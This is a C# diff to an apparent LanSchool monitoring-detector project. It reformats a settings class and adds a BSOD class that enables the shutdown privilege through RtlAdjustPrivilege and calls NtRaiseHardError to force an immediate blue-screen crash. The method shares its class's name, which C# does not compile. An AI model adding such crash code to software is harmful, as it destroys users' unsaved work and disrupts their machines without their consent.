@@ -25,19 +25,37 @@ using System.IO;
 namespace Lan_School_Monitor
 {
 	public class setting
+	{
+		public setting() //public setting(Toggle_WIFI_ = false, Notify = true, Hide = true)
 		{
-			public setting() //public setting(Toggle_WIFI_ = false, Notify = true, Hide = true)
-			{
-				Toggle_WIFI = false;
-				Notify = true;
-				Hide = true;
-				CloseTaskManager = false;
-			}
-			public bool Toggle_WIFI { get; set; }
-			public bool Notify { get; set; }
-			public bool Hide { get; set; }
-			public bool CloseTaskManager { get; set;}
+			Toggle_WIFI = false;
+			Notify = true;
+			Hide = true;
+			CloseTaskManager = false;
 		}
+		public bool Toggle_WIFI { get; set; }
+		public bool Notify { get; set; }
+		public bool Hide { get; set; }
+		public bool CloseTaskManager { get; set;}
+	}
+
+
+	public class BSOD
+	{
+		[DllImport("ntdll.dll")]
+		public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+
+		[DllImport("ntdll.dll")]
+		public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+		public static void BSOD()
+		{
+			Boolean t1;
+			uint t2;
+			RtlAdjustPrivilege(19, true, false, out t1);
+			NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
+		}
+	}
 		
 	public class Program
 	{
